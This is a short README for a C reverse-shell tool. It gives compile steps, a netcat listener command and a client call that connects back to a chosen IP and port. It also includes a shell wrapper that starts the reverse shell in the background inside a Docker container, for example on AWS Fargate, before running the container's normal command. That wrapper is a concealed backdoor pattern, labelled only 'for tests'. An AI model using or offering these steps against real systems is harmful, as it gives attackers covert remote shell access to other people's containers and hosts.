# simple-reverse-shell
C program for reverse shell

## How to use?

### Compile
git clone https://github.com/vizarch/simple-reverse-shell
cd simple-reverse-shell
gcc rshell.c -o rshell

### Run
- Listener machine (use netcat)
    - nc -lp 4444

- Client machine
    - ./rshell IP PORT
        - IP - IPv4 address of listener machine
        - PORT - port above (4444)

### Example use case

Enter into Docker container (for example: AWS Fargate)
- **only for tests**
- create script wrapper for CMD
```bash
#!/bin/sh
set -m # for job control, im not sure about this line

./rshell IP PORT & # put in background

exec CMD
```
